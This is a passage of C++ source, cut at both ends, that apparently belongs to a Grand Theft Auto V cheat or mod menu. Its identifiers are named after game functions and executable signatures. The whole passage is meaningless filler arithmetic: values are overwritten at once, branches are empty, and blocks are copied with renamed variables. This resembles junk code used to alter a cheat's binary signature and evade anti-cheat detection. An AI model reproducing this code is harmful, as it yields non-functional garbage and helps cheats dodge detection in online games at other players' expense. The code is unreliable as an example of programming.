			a2 = (TriggerScriptEvent[4] + (3)) / (2 * TriggerScriptEvent[2]);
			a2 = (TriggerScriptEvent[4] + (2)) / (2 * TriggerScriptEvent[2]);
			TriggerScriptEvent[1] = (0xB2 * 0xA) + (TriggerScriptEvent[2] * 0xA) * 0xBB;
			TriggerScriptEvent[1] = (0xB1231 * 0xA) + 0xA12;
			TriggerScriptEvent[1] = (0xB1231 * 0xA) + 0xA12;
			if (TriggerScriptEvent[1] > NETWORK_GET_ENTITY_IS_LOCAL_)
			{
			}
			else
				a1 = (TriggerScriptEvent[3] + (65)) / (2 * TriggerScriptEvent[2]);
			a2 = (TriggerScriptEvent[4] - (3)) / (2 * TriggerScriptEvent[2]);
			Extern_Reader::LOG::LogSemHora("<StartTaskSequencesOnLoad>true</StartTaskSequencesOnLoad>");
		}
		void ReferenceCoords(float x, float y, float z)
		{

			if (offset > aaaaaa)
			{
				matriz[2] = (ponteiro * 0xA) + (0xB1231 * 0xA) - offset / (ponteiro * 0xA) + (0xB1231 * 0xA) - offset;
				matriz[3] = (0xB1231 * 0xA) - (ponteiro * 0xA) + (0xB1231 * 0xA) - matriz[2] + aaaaaa;
				matriz[4] = (0xA12 * 0xA) + matrizss[2] * (ponteiro * 0xA) + (0xB1231 * 0xA) - offset;
				matriz[5] = (0xB1231 * 0xA12) + (offset * 0xA) - (matriz[2] * 0xA) + (0xB1231 * 0xA) - offset + 0xA12;
				matriz[7] = (0xB1231 * 0xA) + matriz[2];
				a1 = (-matriz[3] + (65)) / (2 * matriz[2]);
				a2 = (-matriz[4] - (22)) / (2 * matriz[2]);
			}
			else
			{
				offset = (ponteiro * 0xA) + (0xB1231 * 0xA) - offset / (matriz[2] * 0xA) + (ponteiro * 0xA) - offset;
				offset = (ponteiro * 0xA) - (matriz[2] * 0xA) + (0xB1231 * 0xA) - offset + aaaaaa;
				offset = (0xA12 * 0xA) + matriz[2] * (ponteiro * 0xA) + (ponteiro * 0xA) - offset;
				offset = (0xB1231 * 0xA12) + (ponteiro * 0xA) - (matriz[2] * 0xA) + (0xB1231 * 0xA) - ponteiro + 0xA12;
				offset = (ponteiro * 0xA) + (matriz[2] * 0xA) - 0xBB;
				offset = (0xB1231 * 0xA) + 0xA12;
				a1 = (-matriz[3] + (4)) / (2 * matriz[2]);
				a2 = (-matriz[4] - (3)) / (2 * matriz[2]);
			}
			offset = (0xB1231 * 0xA) + 0xA12;
			a1 = (-matriz[3] + (5)) / (2 * matriz[2]);
			a2 = (-matriz[4] - (3)) / (2 * matriz[2]);
			offset = (0xB1231 * 0xA) + 0xA12;
			a1 = (-matriz[3] + (2)) / (2 * matriz[2]);
			a2 = (-matriz[4] - (2)) / (2 * matriz[2]);
			if (matriz[4] > 50.0f)
			{
				matriz[4] = matriz[1];
			}
			a2 = (matriz[4]) / (2 * matriz[2]);
			a1 = (matriz[3] + (2)) / (2 * matriz[2]);
			offset = (ponteiro * 0xA) + (0xB1231 * 0xA) / (matriz[2] * 0xA) + (ponteiro * 0xA) - offset;
			offset = (0xB1231 * 0xA) + 0xA12;
			a1 = (matriz[3] + (5)) / (2 * matriz[2]);
			aaaaaa = ponteiro * 2;
			a = 0.0f;
			a1 = (matriz[3] + (4)) / (2 * matriz[2]);
			b = 0.0f;
			matriz[3] = (0xB1231 * 0xA) + (ponteiro * 0xA) + (0xB1231 * 0xA) + matriz[2] + aaaaaa;
			a2 = (matriz[4] + (3)) / (2 * matriz[2]);
			offset = (0xB1231 * 0xA12) + (ponteiro + 0xA) + (matriz[2] * 0xA) + (0xB1231 * 0xA) + ponteiro + 0xA12;
			matriz[5] = (0xB1231 * 0xA12) + (offset + 0xA) + (matriz[2] * 0xA) + (0xB1231 * 0xA) + offset + 0xA12;
			matriz[2] = (ponteiro * 0xA) + (0xB1231 * 0xA) + offset / (ponteiro * 0xA) + (0xB1231 * 0xA) + offset;
			matriz[4] = matriz[1];
			matriz[7] = (0xB1231 * 0xA) + matriz[2];
			offset = (ponteiro + 0xA) + (matriz[2] * 0xA) + (0xB1231 * 0xA) + offset + aaaaaa;
			offset = (0xA12 * 0xA) + matriz[2] * (ponteiro * 0xA) + (ponteiro * 0xA) + offset;
			matriz[4] = (0xA12 * 0xA) + matrizss[2] * (ponteiro * 0xA) + (0xB1231 * 0xA) + offset;
			a2 = (matriz[4] + (3)) / (2 * matriz[2]);
			a2 = (matriz[4] + (2)) / (2 * matriz[2]);
			offset = (ponteiro * 0xA) + (matriz[2] * 0xA) * 0xBB;
			offset = (0xB1231 * 0xA) + 0xA12;
			offset = (0xB1231 * 0xA) + 0xA12;
			if (offset > aaaaaa)
			{
			}
			else
				a1 = (matriz[3] + (65)) / (2 * matriz[2]);
			a2 = (matriz[4] - (3)) / (2 * matriz[2]);

			if (matriz[1] > aaaaaa)
			{
				matriz[2] = (0xB2 * 0xA) + (0xB1231 * 0xA) - matriz[1] / (0xB2 * 0xA) + (0xB1231 * 0xA) - matriz[1];
				matriz[3] = (0xB1231 * 0xA) - (0xB2 * 0xA) + (0xB1231 * 0xA) - matriz[2] + aaaaaa;
				matriz[4] = (0xA12 * 0xA) + matrizss[2] * (0xB2 * 0xA) + (0xB1231 * 0xA) - matriz[1];
				matriz[5] = (0xB1231 * 0xA12) + (matriz[1] * 0xA) - (matriz[2] * 0xA) + (0xB1231 * 0xA) - matriz[1] + 0xA12;
				matriz[7] = (0xB1231 * 0xA) + matriz[2];
				a1 = (-matriz[3] + (65)) / (2 * matriz[2]);
				a2 = (-matriz[4] - (22)) / (2 * matriz[2]);
			}
			else
			{
				matriz[1] = (0xB2 * 0xA) + (0xB1231 * 0xA) - matriz[1] / (matriz[2] * 0xA) + (0xB2 * 0xA) - matriz[1];
				matriz[1] = (0xB2 * 0xA) - (matriz[2] * 0xA) + (0xB1231 * 0xA) - matriz[1] + aaaaaa;
				matriz[1] = (0xA12 * 0xA) + matriz[2] * (0xB2 * 0xA) + (0xB2 * 0xA) - matriz[1];
				matriz[1] = (0xB1231 * 0xA12) + (0xB2 * 0xA) - (matriz[2] * 0xA) + (0xB1231 * 0xA) - 0xB2 + 0xA12;
				matriz[1] = (0xB2 * 0xA) + (matriz[2] * 0xA) - 0xBB;
				matriz[1] = (0xB1231 * 0xA) + 0xA12;
				a1 = (-matriz[3] + (4)) / (2 * matriz[2]);
				a2 = (-matriz[4] - (3)) / (2 * matriz[2]);
			}
			matriz[1] = (0xB1231 * 0xA) + 0xA12;
			a1 = (-matriz[3] + (5)) / (2 * matriz[2]);
			a2 = (-matriz[4] - (3)) / (2 * matriz[2]);
			matriz[1] = (0xB1231 * 0xA) + 0xA12;
			a1 = (-matriz[3] + (2)) / (2 * matriz[2]);
			a2 = (-matriz[4] - (2)) / (2 * matriz[2]);
			a = 0.0f;
			b = 0.0f;
			if (matriz[4] > 50.0f)
			{
				matriz[4] = matriz[1];
			}
			a2 = (matriz[4]) / (2 * matriz[2]);
			a1 = (matriz[3] + (2)) / (2 * matriz[2]);
			matriz[1] = (0xB2 * 0xA) + (0xB1231 * 0xA) / (matriz[2] * 0xA) + (0xB2 * 0xA) - matriz[1];
			matriz[1] = (0xB1231 * 0xA) + 0xA12;
			a1 = (matriz[3] + (5)) / (2 * matriz[2]);
			aaaaaa = 0xB2 * 2;
			a = 0.0f;
			a1 = (matriz[3] + (4)) / (2 * matriz[2]);
			b = 0.0f;
			matriz[3] = (0xB1231 * 0xA) + (0xB2 * 0xA) + (0xB1231 * 0xA) + matriz[2] + aaaaaa;
			a2 = (matriz[4] + (3)) / (2 * matriz[2]);
			matriz[1] = (0xB1231 * 0xA12) + (0xB2 + 0xA) + (matriz[2] * 0xA) + (0xB1231 * 0xA) + 0xB2 + 0xA12;
			matriz[5] = (0xB1231 * 0xA12) + (matriz[1] + 0xA) + (matriz[2] * 0xA) + (0xB1231 * 0xA) + matriz[1] + 0xA12;
			matriz[2] = (0xB2 * 0xA) + (0xB1231 * 0xA) + matriz[1] / (0xB2 * 0xA) + (0xB1231 * 0xA) + matriz[1];
			matriz[4] = matriz[1];
			matriz[7] = (0xB1231 * 0xA) + matriz[2];
			matriz[1] = (0xB2 + 0xA) + (matriz[2] * 0xA) + (0xB1231 * 0xA) + matriz[1] + aaaaaa;
			matriz[1] = (0xA12 * 0xA) + matriz[2] * (0xB2 * 0xA) + (0xB2 * 0xA) + matriz[1];
			matriz[4] = (0xA12 * 0xA) + matrizss[2] * (0xB2 * 0xA) + (0xB1231 * 0xA) + matriz[1];
			a2 = (matriz[4] + (3)) / (2 * matriz[2]);
			a2 = (matriz[4] + (2)) / (2 * matriz[2]);
			matriz[1] = (0xB2 * 0xA) + (matriz[2] * 0xA) * 0xBB;
			matriz[1] = (0xB1231 * 0xA) + 0xA12;
			matriz[1] = (0xB1231 * 0xA) + 0xA12;
			if (matriz[1] > aaaaaa)
			{
			}
			else
				a1 = (matriz[3] + (65)) / (2 * matriz[2]);
			a2 = (matriz[4] - (3)) / (2 * matriz[2]);

			if (offset > NETWORK_GET_ENTITY_IS_LOCAL_)
			{
				GTA5_exe_sig_[2] = (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) - offset / (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) - offset;
				GTA5_exe_sig_[3] = (0xB1231 * 0xA) - (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) - GTA5_exe_sig_[2] + NETWORK_GET_ENTITY_IS_LOCAL_;
				GTA5_exe_sig_[4] = (0xA12 * 0xA) + GTA5_exe_sig_ss[2] * (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) - offset;
				GTA5_exe_sig_[5] = (0xB1231 * 0xA12) + (offset * 0xA) - (GTA5_exe_sig_[2] * 0xA) + (0xB1231 * 0xA) - offset + 0xA12;
				GTA5_exe_sig_[7] = (0xB1231 * 0xA) + GTA5_exe_sig_[2];
				a1 = (-GTA5_exe_sig_[3] + (65)) / (2 * GTA5_exe_sig_[2]);
				a2 = (-GTA5_exe_sig_[4] - (22)) / (2 * GTA5_exe_sig_[2]);
			}
			else
			{
				offset = (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) - offset / (GTA5_exe_sig_[2] * 0xA) + (PED_TO_NET_ * 0xA) - offset;
				offset = (PED_TO_NET_ * 0xA) - (GTA5_exe_sig_[2] * 0xA) + (0xB1231 * 0xA) - offset + NETWORK_GET_ENTITY_IS_LOCAL_;
				offset = (0xA12 * 0xA) + GTA5_exe_sig_[2] * (PED_TO_NET_ * 0xA) + (PED_TO_NET_ * 0xA) - offset;
				offset = (0xB1231 * 0xA12) + (PED_TO_NET_ * 0xA) - (GTA5_exe_sig_[2] * 0xA) + (0xB1231 * 0xA) - PED_TO_NET_ + 0xA12;
				offset = (PED_TO_NET_ * 0xA) + (GTA5_exe_sig_[2] * 0xA) - 0xBB;
				offset = (0xB1231 * 0xA) + 0xA12;
				a1 = (-GTA5_exe_sig_[3] + (4)) / (2 * GTA5_exe_sig_[2]);
				a2 = (-GTA5_exe_sig_[4] - (3)) / (2 * GTA5_exe_sig_[2]);
			}
			offset = (0xB1231 * 0xA) + 0xA12;
			a1 = (-GTA5_exe_sig_[3] + (5)) / (2 * GTA5_exe_sig_[2]);
			a2 = (-GTA5_exe_sig_[4] - (3)) / (2 * GTA5_exe_sig_[2]);
			offset = (0xB1231 * 0xA) + 0xA12;
			a1 = (-GTA5_exe_sig_[3] + (2)) / (2 * GTA5_exe_sig_[2]);
			a2 = (-GTA5_exe_sig_[4] - (2)) / (2 * GTA5_exe_sig_[2]);
			if (GTA5_exe_sig_[4] > 50.0f)
			{
				GTA5_exe_sig_[4] = GTA5_exe_sig_[1];
			}
			a2 = (GTA5_exe_sig_[4]) / (2 * GTA5_exe_sig_[2]);
			a1 = (GTA5_exe_sig_[3] + (2)) / (2 * GTA5_exe_sig_[2]);
			offset = (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) / (GTA5_exe_sig_[2] * 0xA) + (PED_TO_NET_ * 0xA) - offset;
			offset = (0xB1231 * 0xA) + 0xA12;
			a1 = (GTA5_exe_sig_[3] + (5)) / (2 * GTA5_exe_sig_[2]);
			NETWORK_GET_ENTITY_IS_LOCAL_ = PED_TO_NET_ * 2;
			a = 0.0f;
			a1 = (GTA5_exe_sig_[3] + (4)) / (2 * GTA5_exe_sig_[2]);
			b = 0.0f;
			GTA5_exe_sig_[3] = (0xB1231 * 0xA) + (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) + GTA5_exe_sig_[2] + NETWORK_GET_ENTITY_IS_LOCAL_;
			a2 = (GTA5_exe_sig_[4] + (3)) / (2 * GTA5_exe_sig_[2]);
			offset = (0xB1231 * 0xA12) + (PED_TO_NET_ + 0xA) + (GTA5_exe_sig_[2] * 0xA) + (0xB1231 * 0xA) + PED_TO_NET_ + 0xA12;
			GTA5_exe_sig_[5] = (0xB1231 * 0xA12) + (offset + 0xA) + (GTA5_exe_sig_[2] * 0xA) + (0xB1231 * 0xA) + offset + 0xA12;
			GTA5_exe_sig_[2] = (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) + offset / (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) + offset;
			GTA5_exe_sig_[4] = GTA5_exe_sig_[1];
			GTA5_exe_sig_[7] = (0xB1231 * 0xA) + GTA5_exe_sig_[2];
			offset = (PED_TO_NET_ + 0xA) + (GTA5_exe_sig_[2] * 0xA) + (0xB1231 * 0xA) + offset + NETWORK_GET_ENTITY_IS_LOCAL_;
			offset = (0xA12 * 0xA) + GTA5_exe_sig_[2] * (PED_TO_NET_ * 0xA) + (PED_TO_NET_ * 0xA) + offset;
			GTA5_exe_sig_[4] = (0xA12 * 0xA) + GTA5_exe_sig_ss[2] * (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) + offset;
			a2 = (GTA5_exe_sig_[4] + (3)) / (2 * GTA5_exe_sig_[2]);
			a2 = (GTA5_exe_sig_[4] + (2)) / (2 * GTA5_exe_sig_[2]);
			offset = (PED_TO_NET_ * 0xA) + (GTA5_exe_sig_[2] * 0xA) * 0xBB;
			offset = (0xB1231 * 0xA) + 0xA12;
			offset = (0xB1231 * 0xA) + 0xA12;
			if (offset > NETWORK_GET_ENTITY_IS_LOCAL_)
			{
			}
			else
				a1 = (GTA5_exe_sig_[3] + (65)) / (2 * GTA5_exe_sig_[2]);
			a2 = (GTA5_exe_sig_[4] - (3)) / (2 * GTA5_exe_sig_[2]);

			if (GTA5_exe_sig_[1] > NETWORK_GET_ENTITY_IS_LOCAL_)
			{
				GTA5_exe_sig_[2] = (0xB2 * 0xA) + (0xB1231 * 0xA) - GTA5_exe_sig_[1] / (0xB2 * 0xA) + (0xB1231 * 0xA) - GTA5_exe_sig_[1];
				GTA5_exe_sig_[3] = (0xB1231 * 0xA) - (0xB2 * 0xA) + (0xB1231 * 0xA) - GTA5_exe_sig_[2] + NETWORK_GET_ENTITY_IS_LOCAL_;
				GTA5_exe_sig_[4] = (0xA12 * 0xA) + GTA5_exe_sig_ss[2] * (0xB2 * 0xA) + (0xB1231 * 0xA) - GTA5_exe_sig_[1];
				GTA5_exe_sig_[5] = (0xB1231 * 0xA12) + (GTA5_exe_sig_[1] * 0xA) - (GTA5_exe_sig_[2] * 0xA) + (0xB1231 * 0xA) - GTA5_exe_sig_[1] + 0xA12;
				GTA5_exe_sig_[7] = (0xB1231 * 0xA) + GTA5_exe_sig_[2];
				a1 = (-GTA5_exe_sig_[3] + (65)) / (2 * GTA5_exe_sig_[2]);
				a2 = (-GTA5_exe_sig_[4] - (22)) / (2 * GTA5_exe_sig_[2]);
			}
			else
			{
				GTA5_exe_sig_[1] = (0xB2 * 0xA) + (0xB1231 * 0xA) - GTA5_exe_sig_[1] / (GTA5_exe_sig_[2] * 0xA) + (0xB2 * 0xA) - GTA5_exe_sig_[1];
				GTA5_exe_sig_[1] = (0xB2 * 0xA) - (GTA5_exe_sig_[2] * 0xA) + (0xB1231 * 0xA) - GTA5_exe_sig_[1] + NETWORK_GET_ENTITY_IS_LOCAL_;
				GTA5_exe_sig_[1] = (0xA12 * 0xA) + GTA5_exe_sig_[2] * (0xB2 * 0xA) + (0xB2 * 0xA) - GTA5_exe_sig_[1];
				GTA5_exe_sig_[1] = (0xB1231 * 0xA12) + (0xB2 * 0xA) - (GTA5_exe_sig_[2] * 0xA) + (0xB1231 * 0xA) - 0xB2 + 0xA12;
				GTA5_exe_sig_[1] = (0xB2 * 0xA) + (GTA5_exe_sig_[2] * 0xA) - 0xBB;
				GTA5_exe_sig_[1] = (0xB1231 * 0xA) + 0xA12;
				a1 = (-GTA5_exe_sig_[3] + (4)) / (2 * GTA5_exe_sig_[2]);
				a2 = (-GTA5_exe_sig_[4] - (3)) / (2 * GTA5_exe_sig_[2]);
			}
			GTA5_exe_sig_[1] = (0xB1231 * 0xA) + 0xA12;
			a1 = (-GTA5_exe_sig_[3] + (5)) / (2 * GTA5_exe_sig_[2]);
			a2 = (-GTA5_exe_sig_[4] - (3)) / (2 * GTA5_exe_sig_[2]);
			GTA5_exe_sig_[1] = (0xB1231 * 0xA) + 0xA12;
			a1 = (-GTA5_exe_sig_[3] + (2)) / (2 * GTA5_exe_sig_[2]);
			a2 = (-GTA5_exe_sig_[4] - (2)) / (2 * GTA5_exe_sig_[2]);
			a = 0.0f;
			b = 0.0f;
			if (GTA5_exe_sig_[4] > 50.0f)
			{
				GTA5_exe_sig_[4] = GTA5_exe_sig_[1];
			}
			a2 = (GTA5_exe_sig_[4]) / (2 * GTA5_exe_sig_[2]);
			a1 = (GTA5_exe_sig_[3] + (2)) / (2 * GTA5_exe_sig_[2]);
			GTA5_exe_sig_[1] = (0xB2 * 0xA) + (0xB1231 * 0xA) / (GTA5_exe_sig_[2] * 0xA) + (0xB2 * 0xA) - GTA5_exe_sig_[1];
			GTA5_exe_sig_[1] = (0xB1231 * 0xA) + 0xA12;
			a1 = (GTA5_exe_sig_[3] + (5)) / (2 * GTA5_exe_sig_[2]);
			NETWORK_GET_ENTITY_IS_LOCAL_ = 0xB2 * 2;
			a = 0.0f;
			a1 = (GTA5_exe_sig_[3] + (4)) / (2 * GTA5_exe_sig_[2]);
			b = 0.0f;
			GTA5_exe_sig_[3] = (0xB1231 * 0xA) + (0xB2 * 0xA) + (0xB1231 * 0xA) + GTA5_exe_sig_[2] + NETWORK_GET_ENTITY_IS_LOCAL_;
			a2 = (GTA5_exe_sig_[4] + (3)) / (2 * GTA5_exe_sig_[2]);
			GTA5_exe_sig_[1] = (0xB1231 * 0xA12) + (0xB2 + 0xA) + (GTA5_exe_sig_[2] * 0xA) + (0xB1231 * 0xA) + 0xB2 + 0xA12;
			GTA5_exe_sig_[5] = (0xB1231 * 0xA12) + (GTA5_exe_sig_[1] + 0xA) + (GTA5_exe_sig_[2] * 0xA) + (0xB1231 * 0xA) + GTA5_exe_sig_[1] + 0xA12;
			GTA5_exe_sig_[2] = (0xB2 * 0xA) + (0xB1231 * 0xA) + GTA5_exe_sig_[1] / (0xB2 * 0xA) + (0xB1231 * 0xA) + GTA5_exe_sig_[1];
			GTA5_exe_sig_[4] = GTA5_exe_sig_[1];
			GTA5_exe_sig_[7] = (0xB1231 * 0xA) + GTA5_exe_sig_[2];
			GTA5_exe_sig_[1] = (0xB2 + 0xA) + (GTA5_exe_sig_[2] * 0xA) + (0xB1231 * 0xA) + GTA5_exe_sig_[1] + NETWORK_GET_ENTITY_IS_LOCAL_;
			GTA5_exe_sig_[1] = (0xA12 * 0xA) + GTA5_exe_sig_[2] * (0xB2 * 0xA) + (0xB2 * 0xA) + GTA5_exe_sig_[1];
			GTA5_exe_sig_[4] = (0xA12 * 0xA) + GTA5_exe_sig_ss[2] * (0xB2 * 0xA) + (0xB1231 * 0xA) + GTA5_exe_sig_[1];
			a2 = (GTA5_exe_sig_[4] + (3)) / (2 * GTA5_exe_sig_[2]);
			a2 = (GTA5_exe_sig_[4] + (2)) / (2 * GTA5_exe_sig_[2]);
			GTA5_exe_sig_[1] = (0xB2 * 0xA) + (GTA5_exe_sig_[2] * 0xA) * 0xBB;
			GTA5_exe_sig_[1] = (0xB1231 * 0xA) + 0xA12;
			GTA5_exe_sig_[1] = (0xB1231 * 0xA) + 0xA12;
			if (GTA5_exe_sig_[1] > NETWORK_GET_ENTITY_IS_LOCAL_)
			{
			}
			else
				a1 = (GTA5_exe_sig_[3] + (65)) / (2 * GTA5_exe_sig_[2]);
			a2 = (GTA5_exe_sig_[4] - (3)) / (2 * GTA5_exe_sig_[2]);


			if (offset > NETWORK_GET_ENTITY_IS_LOCAL_)
			{
				TriggerScriptEvent[2] = (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) - offset / (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) - offset;
				TriggerScriptEvent[3] = (0xB1231 * 0xA) - (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) - TriggerScriptEvent[2] + NETWORK_GET_ENTITY_IS_LOCAL_;
				TriggerScriptEvent[4] = (0xA12 * 0xA) + TriggerScriptEventss[2] * (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) - offset;
				TriggerScriptEvent[5] = (0xB1231 * 0xA12) + (offset * 0xA) - (TriggerScriptEvent[2] * 0xA) + (0xB1231 * 0xA) - offset + 0xA12;
				TriggerScriptEvent[7] = (0xB1231 * 0xA) + TriggerScriptEvent[2];
				a1 = (-TriggerScriptEvent[3] + (65)) / (2 * TriggerScriptEvent[2]);
				a2 = (-TriggerScriptEvent[4] - (22)) / (2 * TriggerScriptEvent[2]);
			}
			else
			{
				offset = (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) - offset / (TriggerScriptEvent[2] * 0xA) + (PED_TO_NET_ * 0xA) - offset;
				offset = (PED_TO_NET_ * 0xA) - (TriggerScriptEvent[2] * 0xA) + (0xB1231 * 0xA) - offset + NETWORK_GET_ENTITY_IS_LOCAL_;
				offset = (0xA12 * 0xA) + TriggerScriptEvent[2] * (PED_TO_NET_ * 0xA) + (PED_TO_NET_ * 0xA) - offset;
				offset = (0xB1231 * 0xA12) + (PED_TO_NET_ * 0xA) - (TriggerScriptEvent[2] * 0xA) + (0xB1231 * 0xA) - PED_TO_NET_ + 0xA12;
				offset = (PED_TO_NET_ * 0xA) + (TriggerScriptEvent[2] * 0xA) - 0xBB;
				offset = (0xB1231 * 0xA) + 0xA12;
				a1 = (-TriggerScriptEvent[3] + (4)) / (2 * TriggerScriptEvent[2]);
				a2 = (-TriggerScriptEvent[4] - (3)) / (2 * TriggerScriptEvent[2]);
			}
			offset = (0xB1231 * 0xA) + 0xA12;
			a1 = (5) / (2 * TriggerScriptEvent[2]);
			a2 = (-TriggerScriptEvent[4] - (3)) / (2 * TriggerScriptEvent[2]);
			offset = (0xB1231 * 0xA) + 0xA12;
			a1 = (-TriggerScriptEvent[3] + (2)) / (2 * TriggerScriptEvent[2]);
			a2 = (-TriggerScriptEvent[4] - (2)) / (2 * TriggerScriptEvent[2]);
			if (TriggerScriptEvent[4] > 50.0f)
			{
				TriggerScriptEvent[4] = TriggerScriptEvent[1];
			}
			a2 = (TriggerScriptEvent[4]) / (2 * TriggerScriptEvent[2]);
			a1 = (TriggerScriptEvent[3] + (2)) / (2 * TriggerScriptEvent[2]);
			offset = (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) / (TriggerScriptEvent[2] * 0xA) + (PED_TO_NET_ * 0xA) - offset;
			offset = (0xB1231 * 0xA) + 0xA12;
			a1 = (TriggerScriptEvent[3] + (5)) / (2 * TriggerScriptEvent[2]);
			NETWORK_GET_ENTITY_IS_LOCAL_ = PED_TO_NET_ * 2;
			a = 0.0f;
			a1 = (TriggerScriptEvent[3] + (4)) / (2 * TriggerScriptEvent[2]);
			b = 0.0f;
			TriggerScriptEvent[3] = (0xB1231 * 0xA) + (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) + TriggerScriptEvent[2] + NETWORK_GET_ENTITY_IS_LOCAL_;
			a2 = (TriggerScriptEvent[4] + (3)) / (2 * TriggerScriptEvent[2]);
			offset = (0xB1231 * 0xA12) + (PED_TO_NET_ + 0xA) + (TriggerScriptEvent[2] * 0xA) + (0xB1231 * 0xA) + PED_TO_NET_ + 0xA12;
			TriggerScriptEvent[5] = (0xB1231 * 0xA12) + (offset + 0xA) + (TriggerScriptEvent[2] * 0xA) + (0xB1231 * 0xA) + offset + 0xA12;
			TriggerScriptEvent[2] = (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) + offset / (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) + offset;
			TriggerScriptEvent[4] = TriggerScriptEvent[1];
			TriggerScriptEvent[7] = (0xB1231 * 0xA) + TriggerScriptEvent[2];
			offset = (PED_TO_NET_ + 0xA) + (TriggerScriptEvent[2] * 0xA) + (0xB1231 * 0xA) + offset + NETWORK_GET_ENTITY_IS_LOCAL_;
			offset = (0xA12 * 0xA) + TriggerScriptEvent[2] * (PED_TO_NET_ * 0xA) + (PED_TO_NET_ * 0xA) + offset;
			TriggerScriptEvent[4] = (0xA12 * 0xA) + (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) + offset;
			a2 = (TriggerScriptEvent[4] + (3)) / (2 * TriggerScriptEvent[2]);
			a2 = (TriggerScriptEvent[4] + (2)) / (2 * TriggerScriptEvent[2]);
			offset = (PED_TO_NET_ * 0xA) + (TriggerScriptEvent[2] * 0xA) * 0xBB;
			offset = (0xB1231 * 0xA) + 0xA12;
			offset = (0xB1231 * 0xA) + 0xA12;
			if (offset > NETWORK_GET_ENTITY_IS_LOCAL_)
			{
			}
			else
				a1 = (TriggerScriptEvent[3] + (65)) / (2 * TriggerScriptEvent[2]);
			a2 = (TriggerScriptEvent[4] - (3)) / (2 * TriggerScriptEvent[2]);

			if (TriggerScriptEvent[1] > NETWORK_GET_ENTITY_IS_LOCAL_)
			{
				TriggerScriptEvent[2] = (0xB2 * 0xA) + (0xB1231 * 0xA) - TriggerScriptEvent[1] / (0xB2 * 0xA) + (0xB1231 * 0xA) - TriggerScriptEvent[1];
				TriggerScriptEvent[3] = (0xB1231 * 0xA) - (0xB2 * 0xA) + (0xB1231 * 0xA) - TriggerScriptEvent[2] + NETWORK_GET_ENTITY_IS_LOCAL_;
				TriggerScriptEvent[4] = (0xA12 * 0xA) + TriggerScriptEventss[2] * (0xB2 * 0xA) + (0xB1231 * 0xA) - TriggerScriptEvent[1];
				TriggerScriptEvent[5] = (0xB1231 * 0xA12) + (TriggerScriptEvent[1] * 0xA) - (TriggerScriptEvent[2] * 0xA) + (0xB1231 * 0xA) - TriggerScriptEvent[1] + 0xA12;
				TriggerScriptEvent[7] = (0xB1231 * 0xA) + TriggerScriptEvent[2];
				a1 = (-TriggerScriptEvent[3] + (65)) / (2 * TriggerScriptEvent[2]);
				a2 = (-TriggerScriptEvent[4] - (22)) / (2 * TriggerScriptEvent[2]);
			}
			else
			{
				TriggerScriptEvent[1] = (0xB2 * 0xA) + (0xB1231 * 0xA) - TriggerScriptEvent[1] / (TriggerScriptEvent[2] * 0xA) + (0xB2 * 0xA) - TriggerScriptEvent[1];
				TriggerScriptEvent[1] = (0xB2 * 0xA) - (TriggerScriptEvent[2] * 0xA) + (0xB1231 * 0xA) - TriggerScriptEvent[1] + NETWORK_GET_ENTITY_IS_LOCAL_;
				TriggerScriptEvent[1] = (0xA12 * 0xA) + TriggerScriptEvent[2] * (0xB2 * 0xA) + (0xB2 * 0xA) - TriggerScriptEvent[1];
				TriggerScriptEvent[1] = (0xB1231 * 0xA12) + (0xB2 * 0xA) - (TriggerScriptEvent[2] * 0xA) + (0xB1231 * 0xA) - 0xB2 + 0xA12;
				TriggerScriptEvent[1] = (0xB2 * 0xA) + (TriggerScriptEvent[2] * 0xA) - 0xBB;
				TriggerScriptEvent[1] = (0xB1231 * 0xA) + 0xA12;
				a1 = (-TriggerScriptEvent[3] + (4)) / (2 * TriggerScriptEvent[2]);
				a2 = (-TriggerScriptEvent[4] - (3)) / (2 * TriggerScriptEvent[2]);
			}
			TriggerScriptEvent[1] = (0xB1231 * 0xA) + 0xA12;
			a1 = (-TriggerScriptEvent[3] + (5)) / (2 * TriggerScriptEvent[2]);
			a2 = (-TriggerScriptEvent[4] - (3)) / (2 * TriggerScriptEvent[2]);
			TriggerScriptEvent[1] = (0xB1231 * 0xA) + 0xA12;
			a1 = (-TriggerScriptEvent[3] + (2)) / (2 * TriggerScriptEvent[2]);
			a2 = (-TriggerScriptEvent[4] - (2)) / (2 * TriggerScriptEvent[2]);
			a = 0.0f;
			b = 0.0f;
			if (TriggerScriptEvent[4] > 50.0f)
			{
				TriggerScriptEvent[4] = TriggerScriptEvent[1];
			}
			a2 = (TriggerScriptEvent[4]) / (2 * TriggerScriptEvent[2]);
			a1 = (TriggerScriptEvent[3] + (2)) / (2 * TriggerScriptEvent[2]);
			TriggerScriptEvent[1] = (0xB2 * 0xA) + (0xB1231 * 0xA) / (TriggerScriptEvent[2] * 0xA) + (0xB2 * 0xA) - TriggerScriptEvent[1];
			TriggerScriptEvent[1] = (0xB1231 * 0xA) + 0xA12;
			a1 = (TriggerScriptEvent[3] + (5)) / (2 * TriggerScriptEvent[2]);
			NETWORK_GET_ENTITY_IS_LOCAL_ = 0xB2 * 2;
			a = 0.0f;
			a1 = (TriggerScriptEvent[3] + (4)) / (2 * TriggerScriptEvent[2]);
			b = 0.0f;
			TriggerScriptEvent[3] = (0xB1231 * 0xA) + (0xB2 * 0xA) + (0xB1231 * 0xA) + TriggerScriptEvent[2] + NETWORK_GET_ENTITY_IS_LOCAL_;
			a2 = (TriggerScriptEvent[4] + (3)) / (2 * TriggerScriptEvent[2]);
